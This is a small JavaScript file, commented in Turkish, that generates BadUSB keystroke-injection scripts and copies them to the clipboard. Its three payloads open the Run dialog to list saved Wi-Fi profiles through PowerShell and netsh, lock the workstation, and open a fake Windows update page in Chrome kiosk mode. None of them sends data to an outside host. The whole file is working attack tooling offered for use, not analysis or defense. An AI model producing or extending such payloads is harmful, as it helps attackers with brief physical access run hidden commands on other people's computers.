// badusb_payloads.js - Gerçek Siber Betik Üretici

function generateBadUsb(type) {
    let script = "";
    if (type === "WIFI") {
        script = "DELAY 500\nGUI r\nDELAY 200\nSTRING powershell\nENTER\nDELAY 500\nSTRING netsh wlan show profiles\nENTER";
    } else if (type === "LOCK") {
        script = "DELAY 500\nGUI r\nDELAY 200\nSTRING rundll32.exe user32.dll,LockWorkStation\nENTER";
    } else if (type === "FAKE") {
        script = "DELAY 500\nGUI r\nDELAY 200\nSTRING chrome --kiosk https://fakeupdate.net/win10/\nENTER";
    }
    
    // Üretilen kodu panoya kopyalar
    navigator.clipboard.writeText(script);
    return script;
}
